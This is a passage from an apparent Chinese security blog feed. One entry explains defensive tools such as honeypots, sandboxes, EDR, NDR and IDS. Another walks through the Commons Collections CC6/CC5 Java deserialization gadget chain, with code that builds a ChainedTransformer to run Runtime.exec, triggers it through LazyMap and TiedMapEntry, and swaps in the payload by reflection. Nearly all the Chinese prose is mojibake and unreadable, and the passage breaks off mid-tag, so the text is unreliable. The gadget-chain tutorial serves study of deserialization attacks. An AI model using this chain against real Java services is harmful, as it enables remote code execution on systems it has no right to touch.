äººä»¬å°±æŠŠæ¬ºéª—æ”»å‡»è€…çš„è¯±é¥µç§°ä¸ºâ€œèœœç½â€</p><p><strong>èœœç½</strong>å°±åƒç½‘ç»œä¸–ç•Œé‡Œçš„ <strong>â€œé’“é±¼é™·é˜±â€</strong>ï¼Œä¸“é—¨ç”¨æ¥å¿½æ‚ é»‘å®¢ã€‚å®ƒçš„æ ¸å¿ƒé€»è¾‘å°±æ˜¯ï¼š<strong>å‡è£…è‡ªå·±æ˜¯ä¸ªâ€œè½¯æŸ¿å­â€ï¼Œå¸å¼•åäººè¿‡æ¥æï¼Œç„¶åå·å·è®°ä¸‹ä»–ä»¬çš„ä½œæ¡ˆæ‰‹æ³•</strong>ã€‚<br>è¯´ç™½äº†ï¼Œèœœç½å°±æ˜¯ä¸€ä¸ª <strong>â€œå‡ç›®æ ‡â€</strong>ï¼Œæ•…æ„éœ²å‡ºç ´ç»½è®©é»‘å®¢æ”»å‡»ï¼Œå®é™…ç›®çš„æ˜¯ä¸ºäº†æ‘¸æ¸…å¯¹æ–¹çš„è·¯æ•°ï¼Œä¿æŠ¤çœŸæ­£çš„ç³»ç»Ÿã€‚</p><h2 id="å¨èƒæƒ…æŠ¥"><a href="#å¨èƒæƒ…æŠ¥" class="headerlink" title="å¨èƒæƒ…æŠ¥"></a>å¨èƒæƒ…æŠ¥</h2><p>å¨èƒæƒ…æŠ¥æ˜¯æŒ‡åœ¨ç½‘ç»œå®‰å…¨é¢†åŸŸä¸­ï¼Œé€šè¿‡å¯¹æ¶æ„æ´»åŠ¨è¿›è¡Œæ”¶é›†ã€åˆ†æå’Œå¤„ç†ï¼Œå½¢æˆæœ‰å…³ç½‘ç»œå¨èƒçš„æƒ…æŠ¥ä¿¡æ¯ï¼Œä»¥ä¾¿åŠæ—¶é‡‡å–æªæ–½ä¿éšœç½‘ç»œå®‰å…¨ã€‚å¨èƒæƒ…æŠ¥ä¸»è¦åŒ…æ‹¬æ¶æ„è½¯ä»¶ã€ç½‘ç»œæ”»å‡»ã€ç½‘ç»œçŠ¯ç½ªç­‰æ–¹é¢çš„æƒ…æŠ¥ä¿¡æ¯ã€‚</p><p> å¨èƒæƒ…æŠ¥å¯ä»¥å¸®åŠ©ç½‘ç»œå®‰å…¨äººå‘˜äº†è§£å½“å‰çš„å¨èƒå½¢åŠ¿ï¼ŒåŠæ—¶å‘ç°å’Œè¯†åˆ«å®‰å…¨å¨èƒï¼Œä»¥ä¾¿é‡‡å–ç›¸åº”çš„åº”å¯¹æªæ–½ã€‚å¨èƒæƒ…æŠ¥çš„æ¥æºåŒ…æ‹¬è‡ªä¸»æ”¶é›†ã€å…±äº«äº¤æµç­‰å¤šç§å½¢å¼ï¼Œå…¶åˆ†æå’Œå¤„ç†è¿‡ç¨‹åˆ™éœ€è¦ä¾é å„ç§æŠ€æœ¯æ‰‹æ®µï¼Œå¦‚å¨èƒæƒ…æŠ¥åˆ†æå·¥å…·ã€æƒ…æŠ¥äº¤æ¢å¹³å°ç­‰ã€‚å¨èƒæƒ…æŠ¥çš„é‡è¦æ€§é€æ¸å—åˆ°å¹¿æ³›å…³æ³¨ï¼Œæˆä¸ºç½‘ç»œå®‰å…¨å·¥ä½œä¸­ä¸å¯æˆ–ç¼ºçš„ä¸€ç¯</p><p><strong>å¨èƒæƒ…æŠ¥</strong>å°±åƒç½‘ç»œä¸–ç•Œçš„ <strong>â€œæ•Œæƒ…æŠ¥å‘Šâ€</strong>ï¼Œä¸“é—¨ç”¨æ¥å¸®ä¼ä¸šå’Œæœºæ„ <strong>æå‰çœ‹æ¸…åäººè¦å¹²å•¥ã€æ€ä¹ˆå¹²ï¼Œç„¶åå µæ­»ä»–ä»¬çš„è·¯</strong>ã€‚ç®€å•æ¥è¯´ï¼Œå°±æ˜¯é€šè¿‡ <strong>æ”¶é›†åäººçš„ä½œæ¡ˆå·¥å…·ã€åˆ†æä»–ä»¬çš„å¥—è·¯ã€é¢„æµ‹ä»–ä»¬çš„ç›®æ ‡</strong>ï¼Œè®©ç½‘ç»œå®‰å…¨ä» <strong>â€œè¢«é»‘å®¢æ‰“å®Œäº†å†å“­â€</strong> å˜æˆ <strong>â€œæå‰æŠŠé—¨ç„Šæ­»â€</strong></p><p>å¸¸è§å¨èƒæƒ…æŠ¥å¹³å°</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://x.threatbook.cn/</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://redqueen.tj-un.com/</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://ti.360.net/</span><br></pre></td></tr></table></figure><h2 id="æ²™ç®±"><a href="#æ²™ç®±" class="headerlink" title="æ²™ç®±"></a>æ²™ç®±</h2><p>æ²™ç®±æ˜¯æŒ‡ä¸€ç§åœ¨å®‰å…¨æµ‹è¯•å’Œå¼€å‘è¿‡ç¨‹ä¸­ä½¿ç”¨çš„è™šæ‹Ÿç¯å¢ƒï¼Œå¯ä»¥æ¨¡æ‹ŸçœŸå®çš„æ“ä½œç³»ç»Ÿå’Œåº”ç”¨ç¨‹åºç¯å¢ƒï¼Œä»¥ä¾¿è¿›è¡Œå®‰å…¨æµ‹è¯•ã€æ¶æ„è½¯ä»¶åˆ†æã€æ¼æ´æŒ–æ˜ç­‰æ“ä½œï¼ŒåŒæ—¶ä¸ä¼šå¯¹çœŸå®ç¯å¢ƒé€ æˆå½±å“ã€‚</p><p> åœ¨æ²™ç®±ä¸­ï¼Œå¯ä»¥è¿è¡Œä¸å—ä¿¡ä»»çš„åº”ç”¨ç¨‹åºå’Œä»£ç ï¼ŒåŒæ—¶ç›‘æ§å…¶è¡Œä¸ºå’Œå½±å“ï¼Œä»¥ä¾¿åŠæ—¶å‘ç°å’Œå¤„ç†å®‰å…¨é—®é¢˜ã€‚æ²™ç®±é€šå¸¸å…·æœ‰éš”ç¦»ã€å¿«ç…§ã€è¿˜åŸã€è°ƒè¯•ç­‰åŠŸèƒ½ï¼Œå¯ä»¥å¸®åŠ©ç ”ç©¶äººå‘˜æ·±å…¥åˆ†ææ¶æ„ä»£ç çš„è¡Œä¸ºå’Œç‰¹å¾ï¼Œå‘ç°æ½œåœ¨çš„æ¼æ´å’Œå®‰å…¨é£é™©ã€‚</p><p> æ²™ç®±å¹¿æ³›åº”ç”¨äºæ¶æ„è½¯ä»¶åˆ†æã€æ¼æ´æŒ–æ˜ã€ç½‘ç»œå®‰å…¨æµ‹è¯•ã€åº”ç”¨ç¨‹åºå¼€å‘å’Œæµ‹è¯•ç­‰é¢†åŸŸï¼Œå¯ä»¥å¸®åŠ©æé«˜å®‰å…¨æ€§å’Œå¯é æ€§ï¼Œå‡å°‘å®‰å…¨é£é™©å’ŒæŸå¤±ã€‚</p><p><strong>æ²™ç®±</strong>å°±åƒç½‘ç»œä¸–ç•Œçš„ <strong>â€œå„¿ç«¥æ²™ç›˜æ¸¸æˆåŒºâ€</strong>â€”â€”åœ¨è¿™ä¸ªéš”ç¦»çš„å°ç©ºé—´é‡Œï¼Œç¨‹åºå¯ä»¥éšä¾¿â€œç©â€ï¼ˆè¿è¡Œï¼‰ï¼Œä½†æ— è®ºæ€ä¹ˆæŠ˜è…¾éƒ½ <strong>ä¸ä¼šå½±å“åˆ°å¤–é¢çš„çœŸå®ä¸–ç•Œ</strong>ã€‚ç®€å•æ¥è¯´ï¼Œå®ƒæ˜¯ä¸€ä¸ª <strong>å®‰å…¨çš„éš”ç¦»ç¯å¢ƒ</strong>ï¼Œä¸“é—¨ç”¨æ¥æµ‹è¯•å¯ç–‘æ–‡ä»¶ã€è¿è¡ŒæœªçŸ¥ç¨‹åºï¼Œæˆ–è€…å¤„ç†æ•æ„Ÿæ•°æ®ï¼Œæ—¢èƒ½æ»¡è¶³åŠŸèƒ½éœ€æ±‚ï¼Œåˆèƒ½é¿å…æç ¸æ•´ä¸ªç³»ç»Ÿ</p><h2 id="ç»ˆç«¯é˜²æŠ¤ï¼ˆEDRï¼‰"><a href="#ç»ˆç«¯é˜²æŠ¤ï¼ˆEDRï¼‰" class="headerlink" title="ç»ˆç«¯é˜²æŠ¤ï¼ˆEDRï¼‰"></a>ç»ˆç«¯é˜²æŠ¤ï¼ˆEDRï¼‰</h2><p>ç»ˆç«¯æ£€æµ‹å’Œå“åº” (EDR) æ˜¯ä¸€æ¬¾è½¯ä»¶ï¼Œæ—¨åœ¨è‡ªåŠ¨ä¿æŠ¤ç»„ç»‡çš„æœ€ç»ˆç”¨æˆ·ã€ç»ˆç«¯è®¾å¤‡å’Œ IT èµ„äº§å…å—é‚£äº›çªç ´é˜²ç—…æ¯’è½¯ä»¶å’Œå…¶ä»–ä¼ ç»Ÿç»ˆç«¯å®‰å…¨å·¥å…·å®‰å…¨é˜²çº¿çš„ç½‘ç»œå¨èƒã€‚ EDR å°†ä»ç½‘ç»œä¸Šçš„æ‰€æœ‰ç»ˆç«¯ï¼ˆå°å¼æœºå’Œç¬”è®°æœ¬ç”µè„‘ã€æœåŠ¡å™¨ã€ç§»åŠ¨è®¾å¤‡ã€IoTï¼ˆç‰©è”ç½‘ï¼‰è®¾å¤‡ç­‰ï¼‰ ä¸­è¿ç»­æ”¶é›†æ•°æ®ã€‚ å®ƒå°†å®æ—¶åˆ†æè¿™äº›æ•°æ®ä»¥æŸ¥æ‰¾å·²çŸ¥æˆ–ç–‘ä¼¼ç½‘ç»œå¨èƒçš„è¯æ®ï¼Œå¹¶ä¸”å¯ä»¥è‡ªåŠ¨ä½œå‡ºå“åº”ä»¥é˜²æ­¢æˆ–å°½å¯èƒ½å‡å°‘æ‰€è¯†åˆ«å¨èƒé€ æˆçš„æŸå¤±ã€‚</p><p>ä½ ç”µè„‘é‡Œæœ‰ä¸ªæ–‡ä»¶çªç„¶å¼€å§‹ç–¯ç‹‚åˆ ä¸œè¥¿ï¼Œä¼ ç»Ÿæ€æ¯’è½¯ä»¶å¯èƒ½ä¸è®¤è¯†å®ƒï¼Œä½†EDRä¼šç«‹åˆ»å‘ç°è¿™æ–‡ä»¶â€œè¡Œä¸ºå¼‚å¸¸â€ï¼Œç›´æ¥æŠŠå®ƒå…³è¿›å°é»‘å±‹ï¼Œç„¶åé€šçŸ¥ç®¡ç†å‘˜ï¼šâ€œæŠ“åˆ°ä¸€ä¸ªæç ´åçš„ï¼â€</p><h2 id="NDR"><a href="#NDR" class="headerlink" title="NDR"></a>NDR</h2><p><strong>NDR</strong>ï¼ˆç½‘ç»œå¨èƒæ£€æµ‹ä¸å“åº”ï¼‰å°±åƒæ˜¯<strong>ç½‘ç»œçš„â€œæ™ºèƒ½ç›‘æ§ç³»ç»Ÿâ€</strong>ï¼Œä¸“é—¨ç›¯ç€ä½ å®¶ç½‘ç»œé‡Œçš„â€œè½¦æµâ€ï¼ˆæ•°æ®æµåŠ¨ï¼‰ï¼Œä¸€æ—¦å‘ç°å¯ç–‘è½¦è¾†ï¼ˆæ¯”å¦‚é»‘å®¢æ”»å‡»ã€ç—…æ¯’ä¼ æ’­ï¼‰ï¼Œå®ƒèƒ½ç«‹åˆ»æŠ¥è­¦ï¼Œç”šè‡³è‡ªåŠ¨æ‹¦ä¸‹è¿™äº›å±é™©åˆ†å­ã€‚<br>NDRå°±åƒ<strong>å…¨ç½‘æ‘„åƒå¤´+è‡ªåŠ¨è­¦æŠ¥å™¨</strong>ï¼Œä¿æŠ¤å®¢æˆ·æ•°æ®ä¸è¢«é»‘å®¢çªƒå–</p><h2 id="IDS"><a href="#IDS" class="headerlink" title="IDS"></a>IDS</h2><p><strong>æ—æŒ‚è®¾å¤‡</strong><br><strong>åœ¨ç½‘ç»œä¸­éƒ¨ç½²IDSè®¾å¤‡å¯ä»¥å¯¹æ•´ä¸ªç½‘ç»œç³»ç»Ÿè¿›è¡Œå®æ—¶ç›‘è§†</strong>ï¼Œå®ƒæŠ“å–ç½‘ç»œä¸­æŒ‡å®šçš„æ•°æ®åŒ…ï¼Œå¯¹å…¶åˆ†æå’Œç»Ÿè®¡ï¼Œå¹¶èƒ½å¤Ÿå±•ç¤ºå…¨é¢çš„ç½‘ç»œç›‘æ§æŠ¥è¡¨ã€‚å¯¹äºåˆ†æå‘ç°çš„å…·æœ‰å¨èƒçš„ç½‘ç»œæ•°æ®æˆ–è€…è¡Œä¸ºäº§ç”Ÿå‘Šè­¦ã€‚IDSçš„ä½¿ç”¨ç»™ç½‘ç»œç®¡ç†äººå‘˜æä¾›äº†éå¸¸å¥½çš„è¾…åŠ©ç®¡ç†å·¥å…·å’Œè¿ç»´ä¾æ®ã€‚</p><p>å¸¸è§å‚å•†è®¾å¤‡</p><h3 id="å¥‡å®‰ä¿¡â€œå¤©çœ¼ï¼ˆNDRï¼‰â€"><a href="#å¥‡å®‰ä¿¡â€œå¤©çœ¼ï¼ˆNDRï¼‰â€" class="headerlink" title="å¥‡å®‰ä¿¡â€œå¤©çœ¼ï¼ˆNDRï¼‰â€"></a>å¥‡å®‰ä¿¡â€œå¤©çœ¼ï¼ˆ<strong>NDR</strong>ï¼‰â€</h3><p>å¥‡å®‰ä¿¡â€œå¤©çœ¼â€æ˜¯ä¸€æ¬¾<strong>é«˜çº§å¨èƒæ£€æµ‹ä¸å“åº”ç³»ç»Ÿ</strong>ï¼Œä¸»è¦ç”¨äºç›‘æµ‹å’Œåˆ†æç½‘ç»œä¸­çš„é«˜çº§å¨èƒï¼ˆå¦‚APTæ”»å‡»ã€å‹’ç´¢è½¯ä»¶ã€æœ¨é©¬ç­‰ï¼‰ï¼Œé€šè¿‡æµé‡åˆ†æã€å¨èƒæƒ…æŠ¥åŒ¹é…ã€æ”»å‡»é“¾è¿˜åŸç­‰æŠ€æœ¯ï¼Œå®ç°<strong>å…¨æµç¨‹å¨èƒæ„ŸçŸ¥ä¸å¤„ç½®</strong>ã€‚å…¶æ ¸å¿ƒåŠŸèƒ½åŒ…æ‹¬ï¼š</p><p><strong>APTæ”»å‡»æ£€æµ‹</strong>ï¼šé€šè¿‡æµé‡é•œåƒé‡‡é›†ã€æ–‡ä»¶è™šæ‹Ÿæ‰§è¡Œï¼ˆæ²™ç®±ï¼‰ã€å¨èƒæƒ…æŠ¥åŒ¹é…ç­‰æŠ€æœ¯ï¼Œç²¾å‡†è¯†åˆ«éšè”½æ€§å¼ºçš„å®šå‘æ”»å‡»</p><p><strong>ç½‘ç»œæµé‡æ·±åº¦è§£æ</strong>ï¼šè¿˜åŸHTTPã€SMTPç­‰åè®®æµé‡ï¼Œæå–ç½‘ç»œå±‚åˆ°åº”ç”¨å±‚çš„æ—¥å¿—æ•°æ®ï¼Œå¹¶åŠ å¯†ä¼ è¾“è‡³åˆ†æå¹³å°å­˜å‚¨</p><p><strong>å¨èƒæƒ…æŠ¥æ•´åˆ</strong>ï¼šç»“åˆå¥‡å®‰ä¿¡è‡ªæœ‰çš„æµ·é‡å¨èƒæƒ…æŠ¥åº“ï¼ˆå¦‚æ¶æ„IPã€åŸŸåã€æ–‡ä»¶å“ˆå¸Œå€¼ï¼‰ï¼Œå®æ—¶åŒ¹é…æ”»å‡»è¡Œä¸º</p><p><strong>æ”»å‡»é“¾å¯è§†åŒ–ä¸æº¯æº</strong>ï¼šåŸºäºATT&amp;CKæ¨¡å‹ï¼Œå°†å‘Šè­¦äº‹ä»¶å…³è”æˆæ”»å‡»é“¾ï¼Œå±•ç¤ºæ”»å‡»è·¯å¾„ã€å—æ„ŸæŸ“èµ„äº§åŠä¿¡æ¯æ³„éœ²æƒ…å†µï¼Œæ”¯æŒå…¨åŒ…å–è¯åˆ†æï¼ˆç±»ä¼¼Wiresharkï¼‰</p><p><strong>è‡ªåŠ¨åŒ–å“åº”å¤„ç½®</strong>ï¼šä¸é˜²ç«å¢™ã€ç»ˆç«¯EDRç­‰è®¾å¤‡è”åŠ¨ï¼Œå®ç°å‘Šè­¦è‡ªåŠ¨å°å µã€éš”ç¦»å—æ„ŸæŸ“ä¸»æœºç­‰æ“ä½œ</p><h4 id="ç³»ç»Ÿç»„æˆ"><a href="#ç³»ç»Ÿç»„æˆ" class="headerlink" title="ç³»ç»Ÿç»„æˆ"></a><strong>ç³»ç»Ÿç»„æˆ</strong></h4><p>å¤©çœ¼ç³»ç»Ÿä¸»è¦ç”±ä»¥ä¸‹æ¨¡å—æ„æˆï¼š</p><p><strong>åˆ†æå¹³å°ï¼ˆç¡¬ä»¶ï¼‰</strong>ï¼šå­˜å‚¨æµé‡æ—¥å¿—å’Œå‘Šè­¦æ•°æ®ï¼Œæä¾›å¨èƒåˆ†æã€æ€åŠ¿æ„ŸçŸ¥å¤§å±å±•ç¤ºï¼Œæ”¯æŒåˆ†å¸ƒå¼å­˜å‚¨å’Œå¿«é€Ÿæ£€ç´¢</p><p><strong>æµé‡ä¼ æ„Ÿå™¨ï¼ˆæ¢é’ˆï¼‰</strong>ï¼šéƒ¨ç½²åœ¨ç½‘ç»œé•œåƒå£ï¼Œå®æ—¶é‡‡é›†å¹¶è§£ææµé‡ï¼Œè¿˜åŸåè®®å†…å®¹ï¼Œç”Ÿæˆæ—¥å¿—å’Œå‘Šè­¦</p><p><strong>æ–‡ä»¶å¨èƒé‰´å®šå™¨ï¼ˆæ²™ç®±ï¼‰</strong>ï¼šå¯¹å¯ç–‘æ–‡ä»¶ï¼ˆå¦‚é‚®ä»¶é™„ä»¶ã€ä¸‹è½½æ–‡ä»¶ï¼‰è¿›è¡Œè™šæ‹Ÿæ‰§è¡Œï¼Œæ£€æµ‹æ¶æ„è¡Œä¸º</p><p><strong>å¨èƒæƒ…æŠ¥ï¼ˆè½¯ä»¶ï¼‰</strong>ï¼šé›†æˆæ¶æ„æ ·æœ¬ç‰¹å¾ã€æ”»å‡»è€…TTPsï¼ˆæˆ˜æœ¯ã€æŠ€æœ¯ã€è¿‡ç¨‹ï¼‰ç­‰æ•°æ®ï¼Œæ”¯æ’‘å¨èƒåŒ¹é…</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;ä¸€ã€ç½‘ç»œå®‰å…¨è®¾å¤‡&quot;&gt;&lt;a href=&quot;#ä¸€ã€ç½‘ç»œå®‰å…¨è®¾å¤‡&quot; class=&quot;headerlink&quot; title=&quot;ä¸€ã€ç½‘ç»œå®‰å…¨è®¾å¤‡&quot;&gt;&lt;/a&gt;ä¸€ã€ç½‘ç»œå®‰å…¨è®¾å¤‡&lt;/h2&gt;&lt;p&gt;ç½‘ç»œå®‰å…¨è®¾å¤‡æ˜¯ä¸€ä¸ªæœ‰è½¯ä»¶å’Œç¡¬ä»¶è®¾å¤‡ç»„åˆè€Œæˆã€åœ¨å†…éƒ¨ç½‘å’Œå¤–éƒ¨ç½‘ä¹‹é—´ã€ä¸“ç”¨ç½‘ä¸å…¬å…±ç½‘ ä¹‹é—´çš„ç•Œé¢</summary>
      
    
    
    
    <category term="hvv" scheme="https://gu0f3n.github.io/categories/hvv/"/>
    
    
    <category term="hvv" scheme="https://gu0f3n.github.io/tags/hvv/"/>
    
  </entry>
  
  <entry>
    <title>cc5</title>
    <link href="https://gu0f3n.github.io/2025/03/27/cc5/"/>
    <id>https://gu0f3n.github.io/2025/03/27/cc5/</id>
    <published>2025-03-27T01:36:35.000Z</published>
    <updated>2025-03-27T11:25:01.387Z</updated>
    
    <content type="html"><![CDATA[<p>ä¹‹å‰åˆ†æè¿‡äº†cc6 cc5åªä¸è¿‡å’Œcc6é“¾å­å…¥å£ç‚¹ä¸ä¸€æ ·</p><p>å…ˆæ€»ç»“ä¸‹cc6</p><h4 id="1-é€ ç‚¸å¼¹ï¼šç»„è£…æ¶æ„ä»£ç é“¾æ¡"><a href="#1-é€ ç‚¸å¼¹ï¼šç»„è£…æ¶æ„ä»£ç é“¾æ¡" class="headerlink" title="1. é€ ç‚¸å¼¹ï¼šç»„è£…æ¶æ„ä»£ç é“¾æ¡"></a><strong>1. é€ ç‚¸å¼¹ï¼šç»„è£…æ¶æ„ä»£ç é“¾æ¡</strong></h4><p><strong>æ ¸å¿ƒæ­¦å™¨</strong>ï¼š<code>ChainedTransformer</code>ï¼ˆé“¾æ¡è½¬æ¢å™¨ï¼‰</p><p>é€šè¿‡åå°„è°ƒç”¨<code>Runtime.getRuntime().exec(&quot;calc&quot;)</code>ï¼Œç›¸å½“äºæŠŠå¼¹è®¡ç®—å™¨çš„æŒ‡ä»¤æ‹†æˆå››æ­¥ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = &#123;  </span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),      <span class="comment">// æ‹¿åˆ°Runtimeç±»  </span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, ...),     <span class="comment">// è·å–getRuntimeæ–¹æ³•  </span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, ...),        <span class="comment">// æ‰§è¡ŒgetRuntime()å¾—åˆ°å®ä¾‹  </span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, ...)           <span class="comment">// è°ƒç”¨execå¼¹è®¡ç®—å™¨  </span></span><br><span class="line">&#125;;  </span><br></pre></td></tr></table></figure><p><strong>ä½œç”¨</strong>ï¼šè¿™å››æ­¥åƒæµæ°´çº¿ä¸€æ ·ä¸²è”ï¼Œæœ€ç»ˆæ‰§è¡Œå‘½ä»¤</p><h3 id="å¤§ç™½è¯è§£é‡ŠCC6é“¾çš„è§¦å‘æµç¨‹"><a href="#å¤§ç™½è¯è§£é‡ŠCC6é“¾çš„è§¦å‘æµç¨‹" class="headerlink" title="å¤§ç™½è¯è§£é‡ŠCC6é“¾çš„è§¦å‘æµç¨‹"></a>å¤§ç™½è¯è§£é‡ŠCC6é“¾çš„è§¦å‘æµç¨‹</h3><p>CC6é“¾å°±åƒåœ¨<strong>å¿«é€’åŒ…è£¹é‡Œè—äº†ä¸€ä¸ªå…¨è‡ªåŠ¨ç‚¸å¼¹</strong>ï¼Œå½“ç›®æ ‡æœåŠ¡å™¨æ‹†å¼€åŒ…è£¹ï¼ˆååºåˆ—åŒ–æ•°æ®ï¼‰æ—¶ï¼Œä¼šè§¦å‘ä¸€ç³»åˆ—è¿é”ååº”ï¼Œæœ€ç»ˆæ‰§è¡Œæ¶æ„å‘½ä»¤ï¼ˆå¦‚å¼¹è®¡ç®—å™¨ï¼‰ã€‚ä»¥ä¸‹æ˜¯é€šä¿—æ‹†è§£ï¼š</p><hr><h4 id="1-é€ ç‚¸å¼¹ï¼šç»„è£…æ¶æ„ä»£ç é“¾æ¡-1"><a href="#1-é€ ç‚¸å¼¹ï¼šç»„è£…æ¶æ„ä»£ç é“¾æ¡-1" class="headerlink" title="1. é€ ç‚¸å¼¹ï¼šç»„è£…æ¶æ„ä»£ç é“¾æ¡"></a><strong>1. é€ ç‚¸å¼¹ï¼šç»„è£…æ¶æ„ä»£ç é“¾æ¡</strong></h4><p>- </p><p>  æ ¸å¿ƒæ­¦å™¨</p><p>  ï¼š</p>  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ChainedTransformer</span><br></pre></td></tr></table></figure><p>  ï¼ˆé“¾æ¡è½¬æ¢å™¨ï¼‰</p><ul><li><p>é€šè¿‡åå°„è°ƒç”¨</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Runtime.getRuntime().exec(&quot;calc&quot;)</span><br></pre></td></tr></table></figure><p>ç›¸å½“äºæŠŠå¼¹è®¡ç®—å™¨çš„æŒ‡ä»¤æ‹†æˆå››æ­¥ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = &#123;  </span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),      <span class="comment">// æ‹¿åˆ°Runtimeç±»  </span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, ...),     <span class="comment">// è·å–getRuntimeæ–¹æ³•  </span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, ...),        <span class="comment">// æ‰§è¡ŒgetRuntime()å¾—åˆ°å®ä¾‹  </span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, ...)           <span class="comment">// è°ƒç”¨execå¼¹è®¡ç®—å™¨  </span></span><br><span class="line">&#125;;  </span><br></pre></td></tr></table></figure></li><li><p><strong>ä½œç”¨</strong>ï¼šè¿™å››æ­¥åƒæµæ°´çº¿ä¸€æ ·ä¸²è”ï¼Œæœ€ç»ˆæ‰§è¡Œå‘½ä»¤ã€‚</p></li></ul><hr><h4 id="2-ä¼ªè£…ç‚¸å¼¹ï¼šLazyMapçš„â€œæ‡’åŠ è½½â€ç‰¹æ€§"><a href="#2-ä¼ªè£…ç‚¸å¼¹ï¼šLazyMapçš„â€œæ‡’åŠ è½½â€ç‰¹æ€§" class="headerlink" title="2. ä¼ªè£…ç‚¸å¼¹ï¼šLazyMapçš„â€œæ‡’åŠ è½½â€ç‰¹æ€§"></a><strong>2. ä¼ªè£…ç‚¸å¼¹ï¼šLazyMapçš„â€œæ‡’åŠ è½½â€ç‰¹æ€§</strong></h4><p><strong>æœºå…³è®¾ç½®</strong>ï¼š<code>LazyMap</code>ï¼ˆæ‡’åŠ è½½åœ°å›¾ï¼‰</p><ul><li>å½“è°ƒç”¨<code>LazyMap.get(&quot;ä¸å­˜åœ¨çš„key&quot;)</code>æ—¶ï¼Œå¦‚æœ<code>key</code>ä¸å­˜åœ¨ï¼Œå°±ä¼šè§¦å‘é¢„è®¾çš„æ¶æ„é“¾æ¡ï¼ˆ<code>ChainedTransformer</code>ï¼‰ã€‚</li></ul><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(), chain);  </span><br></pre></td></tr></table></figure><p><strong>é—®é¢˜</strong>ï¼šç›´æ¥è°ƒç”¨<code>get</code>ä¼šæå‰è§¦å‘ç‚¸å¼¹ï¼Œéœ€åç»­ç»•è¿‡</p><h4 id="3-è®¾ç½®è§¦å‘å¼€å…³ï¼šTiedMapEntryçš„hashCode"><a href="#3-è®¾ç½®è§¦å‘å¼€å…³ï¼šTiedMapEntryçš„hashCode" class="headerlink" title="3. è®¾ç½®è§¦å‘å¼€å…³ï¼šTiedMapEntryçš„hashCode"></a><strong>3. è®¾ç½®è§¦å‘å¼€å…³ï¼šTiedMapEntryçš„hashCode</strong></h4><p><strong>å…³é”®è·³æ¿</strong>ï¼š<code>TiedMapEntry</code>ï¼ˆç»‘å®šåœ°å›¾çš„å…¥å£ï¼‰</p><p>æŠŠ<code>LazyMap</code>å’Œä¸€ä¸ªå‡<code>key</code>ï¼ˆå¦‚<code>&quot;fakeKey&quot;</code>ï¼‰ç»‘å®šåˆ°<code>TiedMapEntry</code>ä¸­</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;fakeKey&quot;</span>);  </span><br></pre></td></tr></table></figure><p><strong>è§¦å‘é€»è¾‘</strong>ï¼š</p><ul><li>å½“è°ƒç”¨<code>entry.hashCode()</code>æ—¶ï¼Œå†…éƒ¨ä¼šæ‰§è¡Œ<code>getValue()</code> â†’ <code>lazyMap.get(&quot;fakeKey&quot;)</code> â†’ è§¦å‘ç‚¸å¼¹ã€‚</li></ul><h4 id="4-ç»•è¿‡æå‰çˆ†ç‚¸ï¼šåå°„ä¿®æ”¹LazyMapçš„å·¥å‚"><a href="#4-ç»•è¿‡æå‰çˆ†ç‚¸ï¼šåå°„ä¿®æ”¹LazyMapçš„å·¥å‚" class="headerlink" title="4. ç»•è¿‡æå‰çˆ†ç‚¸ï¼šåå°„ä¿®æ”¹LazyMapçš„å·¥å‚"></a><strong>4. ç»•è¿‡æå‰çˆ†ç‚¸ï¼šåå°„ä¿®æ”¹LazyMapçš„å·¥å‚</strong></h4><p><strong>å‘ç‚¹</strong>ï¼šåˆå§‹åŒ–<code>LazyMap</code>æ—¶è‹¥ç›´æ¥ç»‘å®šæ¶æ„é“¾æ¡ï¼Œæµ‹è¯•æ—¶ä¼šæå‰å¼¹è®¡ç®—å™¨</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// å…ˆç”¨æ— å®³çš„Transformeråˆå§‹åŒ–  </span></span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(), <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));  </span><br><span class="line"><span class="comment">// åå°„å·å·æ›¿æ¢æˆæ¶æ„é“¾æ¡  </span></span><br><span class="line"><span class="type">Field</span> <span class="variable">factoryField</span> <span class="operator">=</span> lazyMap.getClass().getDeclaredField(<span class="string">&quot;factory&quot;</span>);  </span><br><span class="line">factoryField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">factoryField.set(lazyMap, chain);  </span><br></pre></td></tr></table></figure><p>ç¡®ä¿ç‚¸å¼¹åªåœ¨ååºåˆ—åŒ–æ—¶å¼•çˆ†</p><h4 